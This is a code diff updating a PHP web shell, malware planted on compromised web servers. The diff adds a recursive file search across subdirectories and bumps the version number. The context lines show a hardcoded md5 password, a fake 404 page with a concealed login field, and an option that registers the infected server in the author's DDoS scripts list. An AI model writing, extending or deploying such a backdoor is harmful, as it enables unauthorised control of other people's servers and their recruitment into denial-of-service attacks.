@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 3.42;
+$version            = 3.5;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -616,10 +616,11 @@ function sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writ
 	if(findin != null) $(\'opform\').findin.value=findin;
 	if(re != null) $(\'opform\').re.value=re;
 	if(writabledb != null) $(\'opform\').writabledb.value=writabledb;
+	if(subdirs != null) $(\'opform\').subdirs.value=subdirs;
 }
-function g(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb) {
+function g(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb,subdirs) {
 	if(!action) return;
-	sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb);
+	sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb,subdirs);
 	window.onbeforeunload = null;
 	$(\'opform\').submit();
 }
@@ -643,6 +644,7 @@ makehide('findstr', '');
 makehide('findin', '');
 makehide('re', '');
 makehide('writabledb', '');
+makehide('subdirs','');
 formfoot();
 if (!$dir) {
     $dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
@@ -1184,10 +1186,10 @@ function shownav(e){
         'option' => array('Find in File Names','Find in File Content'),
         'selected' => $findin,
         'nokey' => 1));
-    p('<input name="dir" value="' . $dir . '" type="hidden" /> <input name="re" value="1" type="checkbox" ' . ($re ? 'checked' : '') . ' /> Regular expressions</form></div></td></tr>');
-   p('<tr class="head"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="$(\'ckallbx\').click();" /></td><td><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_filename_'.($sort[1]?0:1).'\',null,null,null,null, null,\'' . $nowpath . '\', \'' . $findstr . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . $writabledb . '\');">File Name</a> '.($p1 == 's_filename_0' ? $uchar : '').($p1 == 's_filename_1' || !$p1 ? $dchar : '').'</td>');
-	p('<td width="16%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_mtime_'.($sort[1]?0:1).'\',null,null,null,null,null,\'' . $nowpath . '\', \'' . $findstr . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . $writabledb . '\');">Last Modified</a> '.($p1 == 's_mtime_0' ? $dchar : '').($p1 == 's_mtime_1' ? $uchar : '').'</td>');
-	p('<td width="10%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_size_'.($sort[1]?0:1).'\',null,null,null,null,null,\'' . $nowpath . '\', \'' . $findstr . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . $writabledb . '\');">Size</a> '.($p1 == 's_size_0' ? $uchar : '').($p1 == 's_size_1' ? $dchar : '').'</td>');
+    p('<input name="dir" value="' . $dir . '" type="hidden" /> <label><input name="re" value="1" type="checkbox" ' . ($re ? 'checked' : '') . ' /> Regular Expressions</label> <label><input name="subdirs" value="1" type="checkbox" ' . ($subdirs ? 'checked' : '') . ' /> Search Subdirectories</label></form></div></td></tr>');
+   p('<tr class="head"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="$(\'ckallbx\').click();" /></td><td><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_filename_'.($sort[1]?0:1).'\',null,null,null,null, null,\'' . $nowpath . '\', \'' . htmlentities($findstr) . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . htmlentities($writabledb) . '\', \'' . ($subdirs ? '1' : '0') . '\');">File Name</a> '.($p1 == 's_filename_0' ? $uchar : '').($p1 == 's_filename_1' || !$p1 ? $dchar : '').'</td>');
+	p('<td width="16%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_mtime_'.($sort[1]?0:1).'\',null,null,null,null,null,\'' . $nowpath . '\', \'' . htmlentities($findstr) . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . htmlentities($writabledb) . '\', \'' . ($subdirs ? '1' : '0') . '\');">Last Modified</a> '.($p1 == 's_mtime_0' ? $dchar : '').($p1 == 's_mtime_1' ? $uchar : '').'</td>');
+	p('<td width="10%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_size_'.($sort[1]?0:1).'\',null,null,null,null,null,\'' . $nowpath . '\', \'' . htmlentities($findstr) . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . htmlentities($writabledb) . '\', \'' . ($subdirs ? '1' : '0') . '\');">Size</a> '.($p1 == 's_size_0' ? $uchar : '').($p1 == 's_size_1' ? $dchar : '').'</td>');
     p('<td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
     $dirdata  = array();
     $filedata = array();
@@ -1199,7 +1201,13 @@ function shownav(e){
         $filedata = GetWFileList($nowpath);
     } else {
         $dirs = @opendir($dir);
-        while ($file = @readdir($dirs)) {
+        if($subdirs && $findstr) $all = glob_recursive($dir . "*");
+        $i = 0;
+        while (($subdirs == false && false !== ($file = @readdir($dirs))) || ($subdirs == true && strlen($findstr) > 0 && $i <= count($all))) {
+            if($subdirs && $findstr){
+                $file = $all[$i];
+                $i++;
+            }
             if ($findstr){
                 if (!in_array(getext($file), explode(',', $writabledb))) continue;
                 if (@is_dir($nowpath . $file)) continue;
@@ -5153,5 +5161,12 @@ function list2array($list) {
 }
 function pr($s){
     echo "<pre>" . print_r($s) . '</pre>';
+}
+function glob_recursive($pattern, $flags = 0){
+    $files = glob($pattern, $flags);
+    foreach (glob(dirname($pattern).'/*', GLOB_ONLYDIR|GLOB_NOSORT) as $dir){
+        $files = array_merge($files, glob_recursive($dir.'/'.basename($pattern), $flags));
+    }
+    return $files;
 }
 die();
